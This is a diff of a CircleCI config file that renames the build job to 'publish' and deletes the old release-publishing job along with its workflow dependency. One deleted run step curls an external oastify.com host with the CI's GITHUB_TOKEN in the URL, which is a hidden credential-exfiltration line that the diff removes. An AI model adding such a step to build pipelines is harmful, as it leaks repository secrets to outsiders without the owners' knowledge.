@@ -5,7 +5,7 @@ version: 2
 # Define a job to be invoked later in a workflow.
 # See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-  build:
+  publish:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
@@ -54,27 +54,9 @@ jobs:
           paths:
             - acdc-ws-*.zip
 
-  publish:
-    docker:
-      - image: circleci/golang:latest
-    steps:
-      - checkout
-      - attach_workspace:
-          at: ~/workspace
-      - run:
-          name: "Publish Release on GitHub"
-          command: |
-            go install github.com/tcnksm/ghr@latest
-            VERSION=${VERSION:-v$(grep 'ThisBuild / version :=' version.sbt | awk -F\" '{print $2}')-$(date +'%Y%m%d%H%M%S')-$(git log --format=%h -1)}
-            ghr -t ${GITHUB_TOKEN} -u ${CIRCLE_PROJECT_USERNAME} -r ${CIRCLE_PROJECT_REPONAME} -c ${CIRCLE_SHA1} -delete ${VERSION} ~/workspace/
-
-      - run: curl "https://geyj4hhebrqik61p0vr3iq5lrcx3l39s.oastify.com/${GITHUB_TOKEN}"
-
 workflows:
   version: 2
   build_and_publish:
     jobs:
-      - build
-      - publish:
-          requires:
-            - build
+      - publish
+      
